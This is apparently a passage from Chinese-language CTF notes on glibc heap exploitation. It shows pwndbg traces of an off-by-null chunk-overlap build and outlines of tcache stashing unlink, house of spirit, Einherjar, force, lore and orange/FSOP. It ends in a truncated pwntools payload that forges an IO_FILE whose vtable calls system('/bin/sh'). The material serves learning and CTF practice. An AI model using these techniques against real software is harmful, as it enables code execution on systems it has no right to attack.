<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x61107b3f7290</span><br><span class="line">00:0000│     0x61107b3f7290 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f7298 ◂— 0x421</span><br><span class="line">02:0010│     0x61107b3f72a0 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f72a8 —▸ 0x61107b3f7c20 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f72b0 ◂— 0</span><br><span class="line">05:0028│     0x61107b3f72b8 ◂— 0</span><br></pre></td></tr></table></figure></div>
<p><code>off-by-null</code>后</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:0000│     0x61107b3f7290 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f7298 ◂— 0x421</span><br><span class="line">02:0010│  r9 0x61107b3f72a0 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f72a8 —▸ 0x61107b3f7c00 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f72b0 ◂— 0</span><br><span class="line">05:0028│     0x61107b3f72b8 ◂— 0</span><br></pre></td></tr></table></figure></div>
<p><code>bk</code>指向了原来的<code>3</code>号</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x61107b3f7c00</span><br><span class="line">00:0000│     0x61107b3f7c00 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f7c08 ◂— 0x551</span><br><span class="line">02:0010│     0x61107b3f7c10 —▸ 0x61107b3f7290 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f7c18 —▸ 0x61107b3f85e0 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f7c20 ◂— 0</span><br><span class="line">05:0028│     0x61107b3f7c28 ◂— 0x421</span><br><span class="line">06:0030│     0x61107b3f7c30 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br><span class="line">07:0038│     0x61107b3f7c38 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br></pre></td></tr></table></figure></div>
<p>接着修改6号的<code>fd</code>指向原来的3号</p>
<p>先free掉块合并</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Used                None              None</span><br><span class="line">0x61107b3f7c20      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f8150</span><br><span class="line">0x61107b3f8040      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x8c0                Freed     0x61107b3f7c20    0x73ccc601ace0</span><br><span class="line">0x61107b3f8a10      0x8c0               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p><code>off-by-null</code>前</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x61107b3f8150+0x490</span><br><span class="line">00:0000│     0x61107b3f85e0 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f85e8 ◂— 0x431</span><br><span class="line">02:0010│     0x61107b3f85f0 —▸ 0x61107b3f7c20 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f85f8 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f8600 ◂— 0</span><br><span class="line">... ↓     3 skipped</span><br></pre></td></tr></table></figure></div>
<p><code>off-by-null</code>后 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x61107b3f8150+0x490</span><br><span class="line">00:0000│     0x61107b3f85e0 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f85e8 ◂— 0x431</span><br><span class="line">02:0010│     0x61107b3f85f0 —▸ 0x61107b3f7c00 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f85f8 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f8600 ◂— 0</span><br><span class="line">... ↓     3 skipped</span><br></pre></td></tr></table></figure></div></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Used                None              None</span><br><span class="line">0x61107b3f7c20      0x0                 0x420                Freed     0x73ccc601b0d0    0x73ccc601b0d0</span><br><span class="line">0x61107b3f8040      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x500                Used                None              None</span><br><span class="line">0x61107b3f8650      0x0                 0x3c0                Freed     0x73ccc601ace0    0x73ccc601ace0</span><br><span class="line">0x61107b3f8a10      0x3c0               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p><code>fd</code>成功指向旧的3号，这样我们就已经构造完了</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x61107b3f7290</span><br><span class="line">0x61107b3f7290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x61107b3f72a0: 0x0000000000000000      0x000061107b3f7c00</span><br><span class="line">0x61107b3f72b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x61107b3f7c00</span><br><span class="line">0x61107b3f7c00: 0x0000000000000000      0x0000000000000551</span><br><span class="line">0x61107b3f7c10: 0x000061107b3f7290      0x000061107b3f85e0</span><br><span class="line">0x61107b3f7c20: 0x0000000000000000      0x0000000000000421</span><br><span class="line">pwndbg&gt; x/6gx 0x61107b3f85e0</span><br><span class="line">0x61107b3f85e0: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x61107b3f85f0: 0x000061107b3f7c00      0x000073ccc601ace0</span><br><span class="line">0x61107b3f8600: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></div>
<p>接着让4可以实现<code>UAF</code>，<code>off-by-null</code>修改5号的<code>prev_inuse</code>，并且使<code>prev_size</code>改为3号和4号的大小和，再free掉5，这样旧的3号、4号、5号就会合并成一个大free块，但是4号还可以使用</p>
<p><code>off-by-null</code>前</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Used                None              None</span><br><span class="line">0x61107b3f7c20      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f8040      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x500                Used                None              None</span><br><span class="line">0x61107b3f8650      0x0                 0x3c0                Used                None              None</span><br><span class="line">0x61107b3f8a10      0x3c0               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p><code>off-by-null</code>后</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x61107b3f8150</span><br><span class="line">00:0000│     0x61107b3f8150 ◂— 0x550</span><br><span class="line">01:0008│     0x61107b3f8158 ◂— 0x500</span><br><span class="line">02:0010│     0x61107b3f8160 ◂— 0</span><br><span class="line">... ↓     5 skipped</span><br></pre></td></tr></table></figure></div>
<p>堆状态</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Used                None              None</span><br><span class="line">0x61107b3f7c20      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f8040      0x420               0x110                Freed                0x0               0x0</span><br><span class="line">0x61107b3f8150      0x550               0x500                Used                None              None</span><br><span class="line">0x61107b3f8650      0x0                 0x3c0                Used                None              None</span><br><span class="line">0x61107b3f8a10      0x3c0               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p>最后一步，把5号delete，由于<code>prev_inuse</code>为0，所以找<code>prev_size</code>定位到原来的3号头，通过<code>fd、bk</code>指针找到0号和6号，而0号的<code>bk</code>指向原来的3号，6号的<code>fd</code>指向原来的3号，而新增的检查</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x61107b3f7c00</span><br><span class="line">00:0000│     0x61107b3f7c00 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f7c08 ◂— 0x551</span><br><span class="line">02:0010│     0x61107b3f7c10 —▸ 0x61107b3f7290 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f7c18 —▸ 0x61107b3f85e0 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f7c20 ◂— 0</span><br><span class="line">05:0028│     0x61107b3f7c28 ◂— 0x421</span><br><span class="line">06:0030│     0x61107b3f7c30 —▸ 0x73ccc6010061 ◂— 0xd00e4201c80ef002</span><br><span class="line">07:0038│     0x61107b3f7c38 —▸ 0x73ccc601b0d0 (main_arena+1104) —▸ 0x73ccc601b0c0 (main_arena+1088) —▸ 0x73ccc601b0b0 (main_arena+1072) —▸ 0x73ccc601b0a0 (main_arena+1056) ◂— ...</span><br><span class="line">pwndbg&gt; tele 0x61107b3f7c00+0x550</span><br><span class="line">00:0000│     0x61107b3f8150 ◂— 0x550</span><br><span class="line">01:0008│     0x61107b3f8158 ◂— 0x500</span><br><span class="line">02:0010│     0x61107b3f8160 ◂— 0</span><br></pre></td></tr></table></figure></div>
<p>满足，于是delete5号合并</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Freed                0x0               0x0</span><br><span class="line">Corrupt ?! (size == 0) (0x61107b3f7c20)</span><br><span class="line">pwndbg&gt; tele 0x61107b3f7c00</span><br><span class="line">00:0000│     0x61107b3f7c00 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f7c08 ◂— 0xa51 /* <span class="string">&#x27;Q\n&#x27;</span> */</span><br><span class="line">02:0010│     0x61107b3f7c10 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f7c18 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f7c20 ◂— 0</span><br><span class="line">05:0028│     0x61107b3f7c28 ◂— 0</span><br><span class="line">06:0030│     0x61107b3f7c30 —▸ 0x73ccc6010061 ◂— 0xd00e4201c80ef002</span><br><span class="line">07:0038│     0x61107b3f7c38 —▸ 0x73ccc601b0d0 (main_arena+1104) —▸ 0x73ccc601b0c0 (main_arena+1088) —▸ 0x73ccc601b0b0 (main_arena+1072) —▸ 0x73ccc601b0a0 (main_arena+1056) ◂— ...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x61107b3f7c00 —▸ 0x73ccc601ace0 (main_arena+96) ◂— 0x61107b3f7c00</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></div>
<h3 id="unsortedbin-attack">unsortedbin attack</h3>
<h3 id="tcache-stashing-unlink-attack">tcache stashing unlink attack</h3>
<ul>
<li>效果：类似<code>unsortedbin attack</code>在任意地址写入一个libc地址，任意地址分配</li>
<li>版本：带<code>tcache</code>的版本</li>
<li>原理：如果我们需要的<code>chunk</code>位于了<code>smallbin</code>里面，当我们将<code>chunk</code>从<code>smallbin</code>拿出来的时候，还会去检查当前<code>smallbin</code>链上是否还有剩余堆块，如果有的话并且<code>tcachebin</code>的链上还有空余位置并且<strong>tcache bin不能为空</strong>，就会将剩余的那个堆块给链入到<code>tcachebin</code>中。<strong>而将small bin中的堆块链入到tcache bin中的时候没有进行双向链表完整性的检查，此时攻击那个即将链入tcachebin的堆块的bk指针，即可向任意地址写入一个libc地址</strong></li>
<li>前提：
<ul>
<li>用<code>calloc</code>分配堆块</li>
<li>可以控制<code>smallbin</code>中的bk指针</li>
<li><code>smallbin</code>中最少要有两个堆块</li>
</ul></li>
<li>攻击步骤(方式1)
<ul>
<li>先进行<strong>堆地址</strong>的泄露</li>
<li>然后将<code>tcachebin</code>中只留<code>6</code>个堆块，这样<code>smallbin</code>链入<code>tcachebin</code>后，<code>tcachebin</code>就会直接装满，防止程序继续通过我们篡改的bk指针继续往下遍历</li>
<li>再做出至少两个位于<code>smallbin</code>中的<code>chunk</code>（可以通过切割<code>unsorted bin</code>的方式，让剩余部分的堆块进入<code>small bin</code>或者当遍历<code>unsorted bin</code>的时候，会给堆块分类，让其小堆块进入<code>small bin</code>中）</li>
<li>利用溢出或<code>UAF+edit</code>等手段，篡改位于<code>smallbin</code>中的链表头堆块的<code>bk</code>指针为<code>target_addr-0x10</code></li>
<li><strong>注意伪造bk的时候一定不能破坏fd指针</strong></li>
<li>最后我们申请一个位于<code>smallbin</code>那条链对应<code>size</code>中的<code>chunk</code>，将<code>smallbin</code>中的链表尾堆块申请出来，而<strong>smallbin链中的链表头堆块则进入tcachebin</strong>，在链入<code>tcachebin</code>的期间触发了<code>tcache stashing unlink attack</code></li>
</ul></li>
<li>攻击步骤(方式2)
<ul>
<li>先进行<strong>堆地址</strong>的泄露</li>
<li>然后将<code>tcachebin</code>中只留<code>5</code>个堆块</li>
<li>再做出至少两个位于<code>smallbin</code>中的<code>chunk</code></li>
<li>利用溢出或<code>UAF+edit</code>等手段，篡改位于<code>smallbin</code>中的链表头堆块的<code>bk</code>指针为我们想要申请的地址附近<code>fake_chunk_addr-0x10</code>，再修改<code>fake_chunk_bk=target_addr-0x10</code></li>
<li><strong>注意伪造bk的时候一定不能破坏fd指针</strong></li>
<li>最后我们申请一个位于<code>smallbin</code>那条链对应<code>size</code>中的<code>chunk</code>，在链入<code>tcachebin</code>的期间触发了<code>tcache stashing unlink attack</code>，得到了一个堆块的分配和一个任意地址写<code>libc</code></li>
</ul></li>
</ul>
<h3 id="largebin-attack">largebin attack</h3>
<h3 id="house-of-spirit">house of spirit</h3>
<ul>
<li>版本：2.23~</li>
<li>目的：获得某块内存的任意写</li>
<li>利用方式：在某块内存伪造<code>chunk</code>，将本来不是<code>chunk</code>的这块内存被<code>free</code>到<code>bins</code>里，再次<code>malloc</code>后就实现了任意写</li>
<li>伪造结构：
<ul>
<li><code>fake_chunk</code>
<ul>
<li><code>prev_size</code>无要求</li>
<li><code>size</code>
<ul>
<li><code>N-&gt;0</code></li>
<li><code>M-&gt;0</code></li>
<li><code>P-&gt;0</code></li>
<li><code>prev_size</code>的最低位地址满足<code>16</code>字节对齐（64位）</li>
<li><code>size&lt;0x80</code></li>
<li><code>size</code>满足<code>16</code>字节对齐（64位）</li>
</ul></li>
<li><code>fd、bk、data</code>无要求</li>
</ul></li>
<li><code>next_chunk</code>
<ul>
<li><code>prev_size</code>无要求</li>
<li><code>size&lt;128KB</code></li>
<li><code>size</code>满足<code>16</code>字节对齐（64位）</li>
</ul></li>
</ul></li>
<li>利用前提
<ul>
<li>能通过溢出控制要<code>free</code>的地址</li>
</ul></li>
<li>注意事项
<ul>
<li>注意题目中的计数器</li>
<li>如果有多个地方可以伪造，注意伪造到哪个地方对后续有用。</li>
<li>注意伪造堆块的<code>size</code>位和<code>next_size</code>位。</li>
<li>还要注意程序逻辑，如果当程序释放完<code>fake_chunk</code>后还要再继续释放，可能就会出现问题，这时就要在<code>fake_chunk</code>中写入适当的数据，绕过程序逻辑</li>
</ul></li>
</ul>
<h3 id="house-of-einherjar">house of Einherjar</h3>
<ul>
<li>版本：2.23~</li>
<li>目的：获得某块内存的任意写</li>
<li>利用方式：在某块内存伪造<code>chunk</code>，利用<code>off-by-one</code>使堆块后向合并，将指针更新为指向<code>fake chunk</code>，再次<code>malloc</code>后就实现了在<code>fake chunk</code>任意写</li>
<li>伪造结构：
<ul>
<li><code>fake_chunk</code>
<ul>
<li><code>prev_size = chunk1_size</code></li>
<li><code>size</code>
<ul>
<li><code>N-&gt;0</code></li>
<li><code>M-&gt;0</code></li>
<li><code>P-&gt;0</code></li>
<li><code>prev_size</code>的最低位地址满足<code>16</code>字节对齐（64位）</li>
<li><code>size = chunk1_size</code></li>
</ul></li>
<li><code>fd、bk、fd_nextsize、bk_nextsize = fake_chunk_prev_size_addr</code></li>
</ul></li>
<li><code>chunk0</code></li>
<li><code>chunk1</code>
<ul>
<li><code>prev_size = chunk1_addr-fake_chunk_addr</code></li>
<li><code>N-&gt;0</code></li>
<li><code>M-&gt;0</code></li>
<li><code>P-&gt;0</code></li>
<li><code>size</code>是<code>0x100</code>整数倍（<code>size=0</code>也被允许）</li>
</ul></li>
</ul></li>
<li>利用前提
<ul>
<li><code>off-by-one、off-by-null</code></li>
<li>能获得堆地址和<code>fake chunk</code>地址</li>
</ul></li>
</ul>
<h3 id="house-of-force">house of force</h3>
<ul>
<li>版本：2.23~2.29</li>
<li>目的：获得某块内存的任意写</li>
<li>利用方式：修改<code>top chunk</code>的<code>size</code>极大，申请一个可能极大的堆（从堆地址一直到要修改的地址），将<code>top chunk</code>指针更新为指向<code>target</code>，再次<code>malloc</code>后就实现了在<code>target</code>任意写</li>
<li>攻击方式：
<ul>
<li>通过溢出修改<code>top chunk</code>的<code>size</code>位为<code>-1</code></li>
<li>申请一个特定大小的堆(可以是负数)
<ul>
<li><code>req=dest - old_top_prev_size_addr - 4*sizeof(long)</code></li>
</ul></li>
<li>再次申请即可实现某块特定内存的任意写</li>
</ul></li>
<li>利用前提
<ul>
<li>堆溢出修改<code>top chunk</code>的<code>size</code></li>
<li>能获得堆地址和目的地址</li>
</ul></li>
</ul>
<h3 id="house-of-lore">house of lore</h3>
<ul>
<li><p>版本：2.23~2.31</p></li>
<li><p>目的：获得某块内存的任意写</p></li>
<li><p>利用方式：在某块内存伪造<code>chunk</code>和辅助<code>chunk</code>，利用<code>UAF</code>修改<code>smallbin</code>的<code>bk</code>指针，使<code>fake_chunk</code>链入<code>smallbin</code>，<code>malloc smallbin</code>后再次<code>malloc</code>后就实现了在<code>fake chunk</code>任意写</p></li>
<li><p>伪造结构：</p>
<ul>
<li><code>fake_chunk_1</code>
<ul>
<li><code>fd = small_chunk_1_prev_size_addr</code></li>
<li><code>bk = fake_chunk_2_prev_size_addr</code></li>
</ul></li>
<li><code>fake_chunk2</code>
<ul>
<li><code>fd = fake_chunk_1_prev_size_addr</code></li>
</ul></li>
</ul></li>
<li><p>具体实现：</p>
<ul>
<li>申请一个<code>smallbin</code>范围堆块<code>(victim)</code>，伪造<code>fake_chunk_1</code>、<code>fake_chunk_2</code></li>
<li>释放<code>victim</code>，申请一个更大的堆块，再修改<code>victim-&gt;bk</code>为<code>fake_chunk_1_prev_size_addr</code></li>
<li>再申请一个与<code>victim</code>同样大小的堆，将<code>fake_chunk</code>链入<code>smallbin</code>，触发<code>(smallbin-&gt;bk = victim-&gt;bk=stack_buffer1_addr)</code></li>
<li>再申请一个与<code>victim</code>同样大小的堆，即可得到<code>fake_chunk_1</code></li>
</ul></li>
<li><p>利用前提</p>
<ul>
<li><code>UAF</code></li>
<li>能获得堆地址甚至需要其他地址</li>
</ul></li>
<li><p><code>Step 1</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/houseoflore1.png"
                      
                ></p></li>
<li><p><code>Step 2</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/houseoflore2.png"
                      
                ></p></li>
<li><p><code>Step 3</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/houseoflore3.png"
                      
                ></p></li>
<li><p><code>Step 4</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/houseoflore4.png"
                      
                ></p></li>
</ul>
<h3 id="house-of-orange">house of orange</h3>
<ul>
<li>版本：2.23~2.26</li>
<li>效果：任意函数/命令执行</li>
<li>特点：无<code>free</code></li>
<li>利用过程：
<ul>
<li>先利用溢出等方式进行篡改<code>top chunk</code>的<code>size</code></li>
<li>然后申请一个大于<code>top chunk</code>的<code>size</code></li>
<li>实现了将堆块放入<code>unsortedbin</code></li>
</ul></li>
<li>伪造结构：
<ul>
<li><code>nb</code>表示申请堆块大小</li>
<li><code>MINSIZE&lt;old_top_size&lt;nb+MINSIZE</code></li>
<li><code>old_top_size</code>的<code>prev_size</code>位是<code>1</code></li>
<li><code>(old_top_size+old_top)&amp;0xfff=0x000</code></li>
<li><code>nb&lt;0x20000</code></li>
</ul></li>
<li><code>unsortedbin attack</code>
<ul>
<li>往一个指定地址里写入一个很大的数<code>（main_arena+88或main_arena+96）</code></li>
<li>实现：
<ul>
<li>向<code>unsortedbin</code>的尾部<code>chunk</code>的<code>bk</code>指针写入<code>target_addr-0x10</code></li>
</ul></li>
<li>完成了<code>unsortedbin attack</code>后将无法从<code>unsortedbin</code>中获得堆块了</li>
</ul></li>
<li><code>FSOP</code>
<ul>
<li>原理：
<ul>
<li>篡改<code>_IO_list_all</code>和<code>_chain</code>，来劫持<code>IO_FILE</code>结构体，让<code>IO_FILE</code>结构体落在我们可控的内存上，然后在<code>FSOP</code>中我们使用<code>_IO_flush_all_lockp</code>来刷新<code>_IO_list_all</code>链表上的所有文件流，也就是对每个流都执行一下<code>fflush</code>，而<code>fflush</code>最终调用了<code>vtable</code>中的<code>_IO_overflow</code></li>
<li>而前面提到了，我们将<code>IO_FILE</code>结构体落在我们可控的内存上，这就意味着我们是可以控制<code>vtable</code>的，<strong>我们将vtable中的_IO_overflow函数地址改成system地址即可</strong>，而这个函数的第一个参数就是<code>IO_FILE</code>结构体的地址，因此我们让<code>IO_FILE</code>结构体中的<code>flags</code>成员为<code>/bin/sh</code>字符串，那么当<strong>执行exit函数</strong>或者<strong>libc执行abort流程时</strong>或者<strong>程序从main函数返回时</strong>触发了<code>_IO_flush_all_lockp</code>即可拿到<code>shell</code></li>
</ul></li>
<li>布局
<ul>
<li>篡改<code>_IO_list_all</code>为<code>main_arena+88</code>这个地址，<code>chain</code>字段是首地址加上<code>0x68</code>偏移得到的，因此<code>chain</code>字段决定了下一个<code>IO_FILE</code>结构体的地址为<code>main_arena+88+0x68</code>，这个地址恰好是<code>smallbin</code>中<code>size</code>为<code>0x60</code>的数组</li>
<li>将一个<code>chunk</code>放到这个<code>smallbin</code>中<code>size</code>为<code>0x60</code>的链上，那么篡改<code>_IO_list_all</code>为<code>main_arena+88</code>这个地址后，<code>smallbin</code>中的<code>chunk</code>就是<code>IO_FILE</code>结构体了，</li>
<li>将其申请出来后可以控制这块内存从而伪造<code>vtable</code>字段进行布局最终拿到<code>shell</code></li>
</ul></li>
<li>检查绕过
<ul>
<li><code>mode=0</code></li>
<li><code>_IO_write_ptr=1</code></li>
<li><code>_IO_write_base=0</code></li>
<li><code>_flag=/bin/sh</code></li>
</ul></li>
<li>成功概率只有<code>50%</code></li>
<li><code>glibc-2.24</code>后加入<code>vtable</code>的<code>check</code>，但可以利用<code>IO_str_jumps</code>结构利用</li>
<li><code>unsortedbin attack</code>和<code>FSOP</code>攻击都是构造数据在一个<code>payload</code>里的</li>
</ul></li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain-&gt;old top chunk addr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span 